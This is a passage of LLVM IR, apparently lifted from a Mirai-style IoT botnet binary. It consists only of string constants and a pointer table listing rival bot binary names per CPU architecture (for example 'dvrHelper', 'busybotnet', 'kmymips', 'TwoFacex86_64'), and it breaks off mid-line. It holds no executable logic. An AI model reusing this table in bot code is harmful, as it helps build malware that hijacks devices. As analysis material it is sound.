@global_var_805b1a1.361 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_805b1aa.362 = constant [10 x i8] c"dvrHelper\00"
@global_var_805b1b4.363 = constant [8 x i8] c"FDFDHFC\00"
@global_var_805b1bc.364 = constant [5 x i8] c"FEUB\00"
@global_var_805b1c1.365 = constant [9 x i8] c"FTUdftui\00"
@global_var_805b1ca.366 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_805b1d3.367 = constant [6 x i8] c"jhUOH\00"
@global_var_805b1d9.368 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_805b1e2.369 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_805b1ec.370 = constant [8 x i8] c"kmymips\00"
@global_var_805b1f4.371 = constant [10 x i8] c"kmymips64\00"
@global_var_805b1fe.372 = constant [10 x i8] c"kmymipsel\00"
@global_var_805b208.373 = constant [9 x i8] c"kmysh2eb\00"
@global_var_805b211.374 = constant [10 x i8] c"kmysh2elf\00"
@global_var_805b21b.375 = constant [7 x i8] c"kmysh4\00"
@global_var_805b222.376 = constant [7 x i8] c"kmyx86\00"
@global_var_805b229.377 = constant [9 x i8] c"kmyarmv5\00"
@global_var_805b232.378 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_805b23d.379 = constant [9 x i8] c"kmyarmv4\00"
@global_var_805b246.380 = constant [9 x i8] c"kmyarmv6\00"
@global_var_805b24f.381 = constant [8 x i8] c"kmyi686\00"
@global_var_805b257.382 = constant [11 x i8] c"kmypowerpc\00"
@global_var_805b262.383 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_805b272.384 = constant [8 x i8] c"kmyi586\00"
@global_var_805b27a.385 = constant [8 x i8] c"kmym68k\00"
@global_var_805b282.386 = constant [9 x i8] c"kmysparc\00"
@global_var_805b28b.387 = constant [10 x i8] c"kmyx86_64\00"
@global_var_805b295.388 = constant [8 x i8] c"lolmips\00"
@global_var_805b29d.389 = constant [10 x i8] c"lolmips64\00"
@global_var_805b2a7.390 = constant [10 x i8] c"lolmipsel\00"
@global_var_805b2b1.391 = constant [9 x i8] c"lolsh2eb\00"
@global_var_805b2ba.392 = constant [10 x i8] c"lolsh2elf\00"
@global_var_805b2c4.393 = constant [7 x i8] c"lolsh4\00"
@global_var_805b2cb.394 = constant [7 x i8] c"lolx86\00"
@global_var_805b2d2.395 = constant [9 x i8] c"lolarmv5\00"
@global_var_805b2db.396 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_805b2e6.397 = constant [9 x i8] c"lolarmv4\00"
@global_var_805b2ef.398 = constant [9 x i8] c"lolarmv6\00"
@global_var_805b2f8.399 = constant [8 x i8] c"loli686\00"
@global_var_805b300.400 = constant [11 x i8] c"lolpowerpc\00"
@global_var_805b30b.401 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_805b31b.402 = constant [8 x i8] c"loli586\00"
@global_var_805b323.403 = constant [8 x i8] c"lolm68k\00"
@global_var_805b32b.404 = constant [9 x i8] c"lolsparc\00"
@global_var_805b334.405 = constant [8 x i8] c"RYrydry\00"
@global_var_805b33c.406 = constant [8 x i8] c"telmips\00"
@global_var_805b344.407 = constant [10 x i8] c"telmips64\00"
@global_var_805b34e.408 = constant [10 x i8] c"telmipsel\00"
@global_var_805b358.409 = constant [9 x i8] c"telsh2eb\00"
@global_var_805b361.410 = constant [10 x i8] c"telsh2elf\00"
@global_var_805b36b.411 = constant [7 x i8] c"telsh4\00"
@global_var_805b372.412 = constant [7 x i8] c"telx86\00"
@global_var_805b379.413 = constant [9 x i8] c"telarmv5\00"
@global_var_805b382.414 = constant [11 x i8] c"telarmv4tl\00"
@global_var_805b38d.415 = constant [9 x i8] c"telarmv4\00"
@global_var_805b396.416 = constant [9 x i8] c"telarmv6\00"
@global_var_805b39f.417 = constant [8 x i8] c"teli686\00"
@global_var_805b3a7.418 = constant [11 x i8] c"telpowerpc\00"
@global_var_805b3b2.419 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_805b3c2.420 = constant [8 x i8] c"teli586\00"
@global_var_805b3ca.421 = constant [8 x i8] c"telm68k\00"
@global_var_805b3d2.422 = constant [9 x i8] c"telsparc\00"
@global_var_805b3db.423 = constant [10 x i8] c"telx86_64\00"
@global_var_805b3e5.424 = constant [12 x i8] c"TwoFacemips\00"
@global_var_805b3f1.425 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_805b3ff.426 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_805b40d.427 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_805b41a.428 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_805b428.429 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_805b433.430 = constant [11 x i8] c"TwoFacex86\00"
@global_var_805b43e.431 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_805b44b.432 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_805b45a.433 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_805b467.434 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_805b474.435 = constant [12 x i8] c"TwoFacei686\00"
@global_var_805b480.436 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_805b48f.437 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_805b4a3.438 = constant [12 x i8] c"TwoFacei586\00"
@global_var_805b4af.439 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_805b4bb.440 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_805b4c8.441 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_805b4d6.442 = constant [9 x i8] c"UYyuyioy\00"
@global_var_805b4df.443 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_805b4e8.444 = constant [5 x i8] c"xxb1\00"
@global_var_805b4ed.445 = constant [5 x i8] c"xxb2\00"
@global_var_805b4f2.446 = constant [5 x i8] c"xxb3\00"
@global_var_805b4f7.447 = constant [5 x i8] c"xxb4\00"
@global_var_805b4fc.448 = constant [5 x i8] c"xxb5\00"
@global_var_805b501.449 = constant [5 x i8] c"xxb6\00"
@global_var_805b506.450 = constant [5 x i8] c"xxb7\00"
@global_var_805b50b.451 = constant [5 x i8] c"xxb8\00"
@global_var_805b510.452 = constant [5 x i8] c"xxb9\00"
@global_var_805b515.453 = constant [6 x i8] c"xxb10\00"
@global_var_805b51b.454 = constant [6 x i8] c"xxb11\00"
@global_var_805b521.455 = constant [6 x i8] c"xxb12\00"
@global_var_805b527.456 = constant [6 x i8] c"xxb13\00"
@global_var_805b52d.457 = constant [6 x i8] c"xxb14\00"
@global_var_805b533.458 = constant [6 x i8] c"xxb15\00"
@global_var_805b539.459 = constant [6 x i8] c"xxb16\00"
@global_var_805b53f.460 = constant [6 x i8] c"xxb17\00"
@global_var_805b545.461 = constant [6 x i8] c"xxb18\00"
@global_var_805b54b.462 = constant [6 x i8] c"xxb19\00"
@global_var_805b551.463 = constant [6 x i8] c"xxb20\00"
@global_var_805b557.464 = constant i32 3276849
@global_var_805b559.465 = constant i32 3342386
@global_var_805b55b.466 = constant i32 3407923
@global_var_805b55d.467 = constant i32 3473460
@global_var_805b55f.468 = constant i32 3538997
@global_var_805b561.469 = constant i32 3604534
@global_var_805b563.470 = constant i32 3670071
@global_var_805b565.471 = constant i32 3735608
@global_var_805b567.472 = constant i32 808517689
@global_var_805b569.473 = constant [3 x i8] c"10\00"
@global_var_805b56c.474 = constant [3 x i8] c"11\00"
@global_var_805b56f.475 = constant [3 x i8] c"12\00"
@global_var_805b572.476 = constant [3 x i8] c"13\00"
@global_var_805b575.477 = constant [3 x i8] c"14\00"
@global_var_805b578.478 = constant [3 x i8] c"15\00"
@global_var_805b57b.479 = constant [3 x i8] c"16\00"
@global_var_805b57e.480 = constant [3 x i8] c"17\00"
@global_var_805b581.481 = constant [3 x i8] c"18\00"
@global_var_805b584.482 = constant [3 x i8] c"19\00"
@global_var_805b587.483 = constant [3 x i8] c"20\00"
@global_var_805b58a.484 = constant [3 x i8] c"bb\00"
@global_var_805b58d.485 = constant [11 x i8] c"busybotnet\00"
@global_var_805b598.486 = constant [5 x i8] c"pppd\00"
@global_var_805b59d.487 = constant [6 x i8] c"pppoe\00"
@global_var_805b5a3.488 = constant [5 x i8] c"wput\00"
@global_var_805b5a8.489 = constant [3 x i8] c"B1\00"
@global_var_805b5ab.490 = constant [3 x i8] c"B2\00"
@global_var_805b5ae.491 = constant [3 x i8] c"B3\00"
@global_var_805b5b1.492 = constant [3 x i8] c"B4\00"
@global_var_805b5b4.493 = constant [3 x i8] c"B5\00"
@global_var_805b5b7.494 = constant [3 x i8] c"B6\00"
@global_var_805b5ba.495 = constant [3 x i8] c"B7\00"
@global_var_805b5bd.496 = constant [3 x i8] c"B8\00"
@global_var_805b5c0.497 = constant [3 x i8] c"B9\00"
@global_var_805b5c3.498 = constant [4 x i8] c"B10\00"
@global_var_805b5c7.499 = constant [4 x i8] c"B11\00"
@global_var_805b5cb.500 = constant [4 x i8] c"B12\00"
@global_var_805b5cf.501 = constant [4 x i8] c"B13\00"
@global_var_805b5d3.502 = constant [4 x i8] c"B14\00"
@global_var_805b5d7.503 = constant [4 x i8] c"B15\00"
@global_var_805b5db.504 = constant [4 x i8] c"B16\00"
@global_var_805b5df.505 = constant [4 x i8] c"B17\00"
@global_var_805b5e3.506 = constant [4 x i8] c"B18\00"
@global_var_805b5e7.507 = constant [4 x i8] c"B20\00"
@global_var_805b5eb.508 = constant [10 x i8] c"dvrhelper\00"
@global_var_805b600.509 = constant [247 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aee4.269, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aee9.270, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a366.271, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aeef.272, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a376.273, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805aef5.274, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aefd.275, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a346.276, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a32e.277, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805af03.278, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805af07.279, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a361.280, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a36b.281, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a333.282, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805af0c.283, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805af10.284, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805af15.285, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805af1c.286, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805af20.287, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805af24.288, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805af29.289, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805af2d.290, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805af10.284, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805af32.291, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805af15.285, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805af39.292, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805af3f.293, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805af1c.286, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805af20.287, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805af46.294, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805af4a.295, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805af50.296, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805af58.297, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805af5e.298, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805af24.288, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805af64.299, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805af6c.300, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805af2d.290, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805af79.301, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805af7e.302, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805af84.303, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805af8b.304, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805af96.305, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805afa3.306, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805afb0.307, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805afbc.308, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805afc9.309, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805afd3.310, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805afdd.311, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805afe9.312, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805aff7.313, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b003.314, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b00f.315, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b01a.316, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_805b028.317, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b03b.318, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b046.319, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b051.320, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b05d.321, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b06a.322, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b075.323, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b082.324, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b08f.325, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b09b.326, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b0a8.327, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b0b2.328, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b0bc.329, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b0c8.330, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b0d6.331, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b0e2.332, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b0ee.333, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b0f9.334, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_805b107.335, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b11a.336, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b125.337, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b130.338, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b13c.339, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b149.340, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b14c.341, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b14f.342, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b152.343, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b155.344, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b158.345, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b15b.346, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b15e.347, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b161.348, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b164.349, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b168.350, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b16c.351, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b170.352, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b174.353, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b178.354, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b17c.355, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b180.356, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b184.357, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b188.358, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b18c.359, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805b190.360, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b1a1.361, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b1aa.362, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b1b4.363, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b1bc.364, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b1c1.365, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b1ca.366, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b1d3.367, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b1d9.368, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b1e2.369, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b1ec.370, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b1f4.371, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b1fe.372, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b208.373, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b211.374, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805b21b.375, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805b222.376, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b229.377, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b232.378, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b23d.379, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b246.380, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b24f.381, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b257.382, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805b262.383, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b272.384, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b27a.385, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b282.386, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b28b.387, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b295.388, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b29d.389, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b2a7.390, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b2b1.391, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b2ba.392, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805b2c4.393, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805b2cb.394, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b2d2.395, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b2db.396, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b2e6.397, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b2ef.398, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b2f8.399, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b300.400, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805b30b.401, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b31b.402, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b323.403, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b32b.404, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b334.405, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b33c.406, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b344.407, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b34e.408, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b358.409, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b361.410, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805b36b.411, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805b372.412, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b379.413, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b382.414, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b38d.415, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b396.416, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b39f.417, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b3a7.418, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805b3b2.419, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b3c2.420, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b3ca.421, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b3d2.422, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b3db.423, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b3e5.424, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b3f1.425, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b3ff.426, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b40d.427, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b41a.428, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b428.429, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b433.430, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b43e.431, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805b44b.432, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b45a.433, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b467.434, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b474.435, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805b480.436, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_805b48f.437, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b4a3.438, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b4af.439, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b4bb.440, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b4c8.441, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b4d6.442, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805af84.303, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b4df.443, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b4e8.444, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b4ed.445, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b4f2.446, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b4f7.447, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b4fc.448, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b501.449, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b506.450, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b50b.451, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b510.452, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b515.453, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b51b.454, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b521.455, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b527.456, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b52d.457, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b533.458, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b539.459, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b53f.460, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b545.461, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b54b.462, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b551.463, i32 0, i32 0), i8* bitcast (i32* @global_var_805b557.464 to i8*), i8* bitcast (i32* @global_var_805b559.465 to i8*), i8* bitcast (i32* @global_var_805b55b.466 to i8*), i8* bitcast (i32* @global_var_805b55d.467 to i8*), i8* bitcast (i32* 